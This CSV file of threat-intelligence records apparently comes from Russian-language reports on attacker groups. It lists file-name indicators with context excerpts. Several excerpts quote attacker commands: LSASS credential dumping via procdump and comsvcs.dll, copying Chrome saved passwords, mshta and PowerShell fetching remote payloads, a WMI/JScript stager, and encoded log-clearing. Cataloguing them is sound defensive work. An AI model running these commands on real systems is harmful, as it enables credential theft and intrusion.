schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:99633d2c68c727b6f3b0e3c4a484bbac19d236434ecccb7eb4344918f1a5a7df,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 217}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cmd.exe /c if not exist ""C:\Users\user\UserCacheHelper.lnk.js"" echo var objService = GetObject(""winmgmts:\\\\.\\root\\cimv2"");var objStartup=objService.Get(""Win32_ProcessStartup"");var objConfig = objStartup.SpawnInstance_();objConfig.ShowWindow = 0;var processClass = objService.Get(""Win32_Process""); var command=""powershell.exe -c \""$raw=Get- Content C:\\Users\\user\\UserCache.ini;Invoke-Expression $raw\"""";var result=processClass.Create(command, null, objConfig, 0); > C:\Users\user\ UserCacheHelp",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:a0fff210b9e2a449963d67550e05d85b0dde99c80d65f369fbc978b499df41a8,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 220}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,wmiprvse.exe -secured -Embedding -> cmd.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<w ord>.hta wsmprovhost.exe -> mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w ord>/<word>.hta T1021.006 Windows Remote Manageme,
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:777b9cc973e275a92fb3d7355deea26ec9fe7dd49878752ded11d588b21d3b61,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 230}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Г раф активностей импланта первой стадии, окончаниеРис. 47-2 T1059.003 Windows Command Shell Злоумышленники вызывают cmd.exe из LNK-файла для вызова команды ""move"", например: Кроме того, они используют cmd.exe для выполнения основного кода из LNK-файла с параметром "" /С"" в командной строке. Process.Start(""cmd.exe"", ""/C move"" + System.Reflection.Assembly. GetExecutingAssembly().Location + "" "" + System.Reflection.Assembly. GetExecutingAssembly().Location + ""_""); Расследование связей между группиро",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:254200395a9d2147a5b7bb55aee00014ebfb0fce5351c021726c5a14ac21919f,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 231}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.007 JavaScript Операторы этой APT использовали код на JScript .NET в начальном LNK-стартере для извлечения вредоносных файлов из архива и их запуска, например: T1204.001 Malicious Link В качестве начального вектора атаки, злоумышленники использовали специальным образом подготовленные фишинговые письма со ссылками, которые вели на страницы, где были расположены архивы с вредоносным ПО. Пользователь должен был кликнуть на ссылку и скачать вредоносный архив (но только этого было недостаточно ",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:a6ea484cdd5bd1146196fb4da50893e229b8ca58e1fedfdd64cee342246fb602,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 249}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1070.001 Clear Windows Event Logs && T1027.010 Command Obfuscation Еще одним из способов снижения обнаружения является использование base64-обфускации для PowerShell-команд, с помощью которых атакующие очищали логи событий Windows: T1218.007 Msiexec Также атакующие были замечены за использованием msiexec.exe для установки вредоносного ПО из .msi-инсталлятора: Декодированный вариант: ""$system32\cmd.exe"",""cmd.exe /Q /c powershell.exe -noni -nop -w 1 -enc IAB3AGUAdgB0AHUAdABpAGwAIABlAGwAIAB8ACAARg",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:ce7caa6ace4fead34221b4df5ffe78d528cd6d6e81c90d5bd7ee5ef3eb66fa64,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 250}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Credential Access T1003.001 LSASS Memory Для дампа LSASS злоумышленники использовали: procdump64.exe -ma lsass.exe lsass.dmp C:\Windows\system32\cmd.exe /Q /c Cmd.ExE /Q /c for /f ""tokens=1,2 delims= "" ^%A in ('""tasklist /fi ""Imagename eq lsass.exe"" | find ""lsass""""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\ bgPk.otf full C:\Windows\temp\handlekatz.exe --pid:784 --outfile:$temp cmd.exe /Q /c $temp\nano.exe --pid 644 --write $temp\20250106_1955.log 1> \Windows\",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:9f62e291db5a9175de04deed0f9708229d34dc6c1d1377c2870b9c8a09a3f476,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 252}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Discovery T1083 File and Directory Discovery Атакующие выполняли PowerShell-команду для проверки наличия и оценки объема данных, хранящихся в директории tdata мессенджера Telegram. Этот каталог содержит критически важные данные пользователя, включая сессионные ключи.T1057 Process Discovery Г руппировка пользовалась tasklist для получения списка процессов на локальной машине: ""$system32\cmd.exe"",""cmd.exe /Q /c powershell -Command ""(Get-ChildItem '$appdata\Telegram Desktop\tdata' -Recurse | Measur",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:d9d640693186379ea11b0f813e5fce3cb8716094a00a0a6fc88e6d95fb80792f,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 253}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1087.001 Local Account Также BO Team использовали PowerShell-командлет для получения списка локальных пользователей в системе: T1087 Account Discovery Чтобы в дальнейшем выполнить боковое перемещение в инфраструктуре, атакующие выполняли сбор событий подключения по протоколу RDP, извлекая данные о пользователях и IP-адресах, использованных для входа в систему, с помощью следующих команд: cmd.exe /Q /c powershell.exe Get-LocalUser | Select name 1> \Windows\Temp\ MbGTqY 2>&1 Get-WinEvent -FilterH",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:35018c580d229e14a6dceac1b942f5a2273e0f9e79062c75a31ca4cd600572eb,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 254}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,T1049 System Network Connections Discovery Злоумышленники осуществляли анализ сетевой активности на предмет установленных соединений с управляющими серверами (C2): T1018 Remote System Discovery Для получения перечня всех компьютеров в домене Active Directory злоумышленники использовали следующие PowerShell-команды: netstat -ano netstat -ano | findstr 109.120.151[.]72 Get-ADComputer -Filter * -Property Name | Select-Object Name $searcher = New-Object DirectoryServices.DirectorySearcher $searcher.,
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:64c3f1845aad88d05eb114b6686ab7c7ef3b6997f2c55789cb2db58acecf1ab2,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 255}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command and Control Lateral Movement Impact T1105 Ingress Tool Transfer Г руппировка загружала вредоносный файл с C2-сервера, маскируя его под легитимный системный компонент и размещала его в директории System32, чтобы затруднить обнаружение и повысить доверие к файлу. T1021.001 Remote Desktop Protocol && T1021.004 SSH Для бокового перемещения в рамках Windows- и Linux-инфраструктуры злоумышленники подключались к системам по протоколу RDP и SSH соответственно. T1486 Data Encrypted for Impact В р",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:e991d25e3a818d099e5dfcccf56ac5293b2a668285c45f2c3830588d1a3da98d,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 282}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Bitrix Доступ к паролям веб-браузеров Еще одним способом сбора учетных данных является анализ конфигурационных файлов Bitrix, которые могут содержать в себе учетные данные (логин и пароль) для подключения к базам данных, а также адрес и имя баз данных. Вот пример одной из команд, используемых атакующими: Команда копирует файл с паролями из профиля пользователя Google Chrome во временную папку Windows (T1555.003 Credentials from Web Browsers) . cat /home/bitrix/ext_www/*/*/php_interface/dbconn.ph",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:dd0675ef22399c4c364257ae23e42316d1b2f51501704dbab12496226e0d0317,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 291}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Портрет атакующего <ScheduledTasks clsid=""*************************************}""> <ImmediateTaskV2 clsid=""****************************"" name=""start"" image=""0"" userContext=""0"" removePolicy=""0"" changed=""****-**-** **:**:**"" uid=""{*************** **********************}""> <Properties action=""C"" name=""start"" runAs=""NT AUTHORITY\System"" logonType=""S4U""> <Task version=""1.2""> <RegistrationInfo> <Author>********************</Author> <Description/> </RegistrationInfo> <Principals> <Principal id=""Author""",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:b3eb3d4cbb5ee64ea09ea9f38718e46b278c64670ec1016cb9eab50b4aaf5f09,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 293}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Портрет атакующего <ScheduledTasks clsid=""*************************************}""> <ImmediateTaskV2 clsid=""****************************"" name=""start"" image=""0"" userContext=""0"" removePolicy=""0"" changed=""****-**-** **:**:**"" uid=""{*************************************}""> <Properties action=""C"" name=""start"" runAs=""NT AUTHORITY\System"" logonType=""S4U""> <Task version=""1.2""> <RegistrationInfo> <Author>********************</Author> <Description/> </RegistrationInfo> <Principals> <Principal id=""Author"">",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:0da7669fd5e6759db72ddf51724fa494029e293e70464ea4e49675ade5e949c3,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 308}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Портрет атакующего Execution Persistence 1 T1059.003 Windows Command Shell TWELVE, C.A.S., Head Mare, BlackJack, Awaken Likho, Angry Likho, Crypt Ghouls, Librarian Likho, BO Team, GOFFEE, XDSpy, Cyberpartisans, Mythic Likho (13) • применяется в качестве batch-скриптов для запуска ВПО, очистки логов, отключения средств защиты; • cmd.exe часто используется при удаленном выполнении команд 2 T1059.001 PowerShell TWELVE, C.A.S., Head Mare, Cloud Atlas, BlackJack, Crypt Ghouls, BO Team, Cyberpartisans",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:3266149c8eb20a47c563b40d69f716ac54b59c202449fe7b38f7c1aa37855b98,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы Имя задачи Командная строка Описание Dead1 reg:\\REGISTRY\MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Schedule\ TaskCache\Tasks\{9042DCD8-1F89-4FC4-8B13- 4D3D5F3AED03}:Actions, `cmd.exe` /c c:\ programdata\twelve.exe -pass [PASS] Запуск шифровальщика через командную строку с передачей пароля в качестве аргумента Dead2 reg:\\REGISTRY\MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Schedule\ TaskCache\Tasks\{AB35C377-2AD2-4",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:8847c5df37ddb85f56471fe0a4da1c65cc9dbd92516cacdf0a440d5dd98ef706,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 49}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Расследование связей между группировками и эволюция угрозы T1059.001 PowerShell Еще одним излюбленным инструментом группировки является фреймворк PowerSploit Злоумышленники используют модуль PowerView для разведки доменных отношений и модификации пользователей и групп. Пример листинга команд PowerShell по импортированию модуля PowerView для выполнения различных действий в доменной инфраструктуре: T1059.003 Windows Command Shell Г руппировка использовала командную строку Windows для запуска шифро,
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:e559e64245f194eeeec0a5eea793d3b80861388ad4e47959ec56b6bfb50184dd,file-name,cmd.exe,cmd.exe,candidate,2022-09-09T00:00:00Z,day,known,same-record,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Impact T1486 Data Encrypted for Impact T1561 Disk Wipe В атаках на Windows-системы группа TWELVE применяла программу-вымогатель LockBit 3 (Black), созданную с помощью появившегося в открытом доступе билдера версии от 2022-09-09. Используемые злоумышленниками экземпляры LockBit 3 (Black) зашифрованы алгоритмом VMPC-KSA3 и требуют для запуска пароль, состоящий из 32 шестнадцатеричных символов. Вымогатель обладает обширной функциональностью, включая шифрование данных алгоритмом Salsa20, удаление те",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:6e96a8136e521abc5894481bb8e734b03a39be29e1a10d7b81470d0478e82303,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 61}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1078 Valid Accounts Для получения первоначального доступа к инфраструктуре государственных организаций, а также компаний из телекоммуникационного и производственного секторов, группировка BlackJack использовала скомпрометированные легитимные учетные записи. Этот подход позволял злоумышленникам действовать от имени легитимных пользователей, снижая вероятность обнаружения на ранних этапах атаки. T1059.001 PowerShell Г руппа BlackJack применяет встроенные PowerShell-команды для перемещения вредоно",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:28aa47d31411b4e0b46d43a0e5a8df72e6b103fe33ba9e296876e89479f85d3a,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 73}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1199 Trusted Relationship В качестве первоначального доступа к инфраструктуре жертвы атакующие воспользовались скомпрометированной учетной записью подрядчика и подключились по VPN. T1190 Exploit Public-Facing Application Кроме действительных учетных данных и взлома через подрядчика, Crypt Ghouls эксплуатировали уязвимость CVE-2021-26084 в Atlassian Confluence, которая позволяет атакующим удаленно выполнять команды на уязвимом сервере: Также мы встретили эксплуатацию MS SQL Server: Initial Acces",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:7c384e1254d1ab4ba0a6adb46420fb9baaa1a0d5240a2b51b10ba55326a5681e,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 74}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.001 PowerShell Атакующие использовали PowerShell для выполнения команд на хостах жертвы: T1059.003 Windows Command Shell Атакующие также использовали cmd.exe для выполнения команд на хостах: T1059.004 Unix Shell Для запуска Babuk на серверах ESXi атакующие использовали Unix Shell: Execution cmd.exe /Q /c powershell.exe ""Get-LocalUser | Select name"" 1> \Windows\Temp\ qnLJbp 2>&1"" powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile ltn.zip -usebasicparsing; expand-ar",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:d784030917879efae4a98ffa5f415e52e23f2df4efefe2772e0137543dce4d76,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 77}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\System32\svchost.exe -k localService -p -s RemoteRegistry RegSaveKey(""$hklm\security"",""$temp\kjzcehld.tmp"") .\gpo_compliance.ps1 cmd.exe /Q /c c:\programdata\allinone2023\XenAllPasswordPro.exe -a c:\ programdata\report.html 1> \Windows\Temp\LNhkey 2>&1 cmd.exe /Q /c copy ""C:\Users\[username]\AppData\Local\Google\Chrome\User Data\Default\Login Data"" ""C:\Windows\Temp\1713909173.8739672"" T1003.002 Security Account Manager Crypt Ghouls использовали Secretsdump (Impacket) для извлечения уч",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:94bcb6e9f6213f610803a8b965942a47963ea29232b995ad4de56489e87cb5dc,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 78}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Parent_image_path: ""c:\windows\system32\wbem\wmiprvse.exe"" Command_line: ""cmd.exe /Q /c powershell.exe ""Get-LocalUser | Select name"" 1> \Windows\Temp\qnLJbp 2>&1"""" powershell ""Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows- TerminalServices-LocalSessionManager/Operational'; Id=25; StartTime=(Get- Date).AddDays(-30)} | ForEach-Object { $userDomain = if ($_.Properties[0]. Value) { $_.Properties[0].Value } else { 'Unknown' }; $ip = if ($_. Properties[2].Value) { $_.Properties[2].Value }",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:98d87bf1d69241e1f5d64e3505ea89f77adabc2bc76960c47d92ec62e354c09e,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"c:\windows\paexec-[xxxxx]-[source_host_redacted].exe -service cmd Parent_image_path: ""c:\windows\system32\wbem\wmiprvse.exe"" Command_line: ""cmd.exe /Q /c powershell.exe ""Get-LocalUser | Select name"" 1> \Windows\Temp\qnLJbp 2>&1""""Parent_image_path: ""c:\windows\system32\rdpclip.exe"" Command_line: ""c:\programdata\1c\allinone2023\xenallpasswordpro.exe -a c:\ programdata\1c\2c.txt"" T1021.002 SMB / Windows Admin Shares Для перемещения между хостами в сети жертвы атакующие использовали популярные PsExe",
1.0.0,actor--anonymous,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:5f0e98ad223576ddb6af2cbbc1a0031a4c4025edc278dfaf523f3bb774b2141c,file-name,(cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--34685a2ac42dfdf7,Anonymous/kaspersky-ics-cert-ttps-of-cyber-partisans-activity-aimed-at-espionage-and-disruption-ru.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 © 2025 АО «ЛАБОРАТОРИЯ КАСПЕРСКОГО» ci Выполнить команду через командную строку (на конкретной зараженной системе, определяемой по идентификатору процесса (PID) работающего на ней экземпляра вредоносного ПО) cl Многократно выполнить команду с заданной задержкой; можно также задать количество попыток выполнения команды cil Комбинация действий команд ci и cl reset Перезапустить процесс интерпретатора командной строки (cmd.exe) v Отправить информацию о зараженной системе: • Версия вредоносного П",
1.0.0,actor--anonymous,artifact--sha256:566eb3ab1cf90bf48be5e893b17b351ff71d367077d780b1893872fdb8ced885,observation--sha256:c2bdb2bd1c274ca2afdc916e22a8ed204f659f1916f3cee6ffe9574e80205b0e,file-name,communigate.exe,communigate.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 164}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"В рамках проведенного исследования были зафиксированы следующие названия, использовавшиеся для маскировки вредоносных компонентов: • libcairo-2.dll, • driver_printer.exe, • chrome_proxy.exe, • onedrivesync.exe, • OneDirveSvh.exe, • windowssubprocessqueue.exe, • dbinit.exe, • nvidiacontrolpanel.exe, • telegram.exe, • yandexupdate.exe, • chrome.exe, • openvpndaemon.exe, • kesservice.exe, • klservice.exe, • GoogleUpdate.exe, • dbexecutor.exe, • ms-teams.exe, • csrss32.exe, • msedgeconnect.exe, • pk",
1.0.0,actor--anonymous,artifact--sha256:860417ede262e5e82facef6c51fa2f2b5a551345b2443564fb11a8496949ef89,observation--sha256:aaa636062429ea38625ae833b3b8b30a42a0b4f84cd844389a7bd8653baa904a,file-name,comsvcs.dll,comsvcs.dll,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 250}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Credential Access T1003.001 LSASS Memory Для дампа LSASS злоумышленники использовали: procdump64.exe -ma lsass.exe lsass.dmp C:\Windows\system32\cmd.exe /Q /c Cmd.ExE /Q /c for /f ""tokens=1,2 delims= "" ^%A in ('""tasklist /fi ""Imagename eq lsass.exe"" | find ""lsass""""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\ bgPk.otf full C:\Windows\temp\handlekatz.exe --pid:784 --outfile:$temp cmd.exe /Q /c $temp\nano.exe --pid 644 --write $temp\20250106_1955.log 1> \Windows\",
1.0.0,actor--anonymous,artifact--sha256:860417ede262e5e82facef6c51fa2f2b5a551345b2443564fb11a8496949ef89,observation--sha256:2d279790417089cbf7932f403a8e41c505ef4d78a528a1d66da89444204beb86,file-name,comsvcs.dll,comsvcs.dll,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 278}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Nanodump Nanodump — это легковесная утилита с открытым исходным кодом, предназначенная для снятия дампа памяти процесса LSASS (Local Security Authority Subsystem Service) в Windows. Nanodump создает дамп LSASS без использования стандартных инструментов Windows (как comsvcs.dll или MiniDumpWriteDump), что помогает обойти антивирусы и EDR-системы. Файл является утилитой nanodump для дампа процесса lsass.exe. В системе были созданы файлы С:\Windows\Temp\2024[REDACTED].log и С:\Windows\ Temp\2024[RE",
1.0.0,actor--anonymous,artifact--sha256:d29123d33e2e07d50fc20cd2a87abae9b347a89b42d8fe93eea7d0b6986268f3,observation--sha256:133a4a089184984c4c13d391c5e81e0496231b865eb1d5afbb2d95fc279b8b22,file-name,config.exe,config.exe,candidate,2025-05-16T00:00:00Z,day,known,same-record,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 235}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"{""CC"":""http://[malicious_C2].com/"",""Extensions"":["".doc"","". pdf""],""LastCommandTime"":""2025-05-16T02:06:26.0692596-07:00""}. T1119 Automated Collection Имплант способен автоматически похищать пользовательские файлы по расширению (список далее) или же он может быть изменен операторами путем передачи другого списка с С2, который будет сохранен в файле config.txt, например: T1115 Clipboard Data Имплант постоянно мониторит буфер обмена, извлекает данные из него и отправляет их на С2. Перед отправкой он ",
